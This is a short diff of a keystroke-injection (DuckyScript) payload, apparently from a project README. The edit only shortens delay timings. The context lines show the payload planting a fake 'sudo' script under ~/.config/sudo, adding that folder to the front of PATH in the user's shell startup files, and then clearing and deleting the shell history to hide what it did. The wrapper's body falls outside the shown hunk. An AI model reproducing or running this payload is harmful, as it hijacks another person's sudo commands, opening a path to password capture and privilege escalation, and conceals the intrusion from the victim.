@@ -62,19 +62,19 @@ STRING fi
 ENTER
 STRING fi' > ~/.config/sudo/sudo
 ENTER
-DELAY 600
+DELAY 200
 STRING chmod u+x ~/.config/sudo/sudo
 ENTER
-DELAY 800
+DELAY 200
 STRING echo "export PATH=~/.config/sudo:$PATH" >> ~/.bash_profile
 ENTER
-DELAY 500
+DELAY 200
 STRING echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc
 ENTER
-DELAY 500
+DELAY 200
 STRING history -c && rm .bash_history && exit
 ENTER
-DELAY 1000
+DELAY 400
 GUI q
 ```
 
